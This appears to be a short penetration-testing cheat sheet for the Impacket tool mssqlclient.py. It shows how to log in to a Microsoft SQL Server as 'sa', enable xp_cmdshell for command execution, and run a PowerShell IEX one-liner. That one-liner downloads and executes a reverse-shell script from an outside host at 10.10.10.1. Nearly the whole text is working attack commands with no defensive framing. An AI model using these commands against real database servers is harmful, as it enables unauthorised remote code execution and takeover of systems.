# mssqlclient.py

### Example Usage

Basic usage:\
`python3 mssqlclient.py sa@[IP]`

Configure xp\_cmdshell:

`sp_configure 'xp_cmdshell', '1'`

`RECONFIGURE`

Enable Code Execution:\
`enable_xp_cmdshell`

Obtaining a reverse shell from mssqlclient.py: \
`xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://10.10.10.1:8080/revshell.ps1\")`
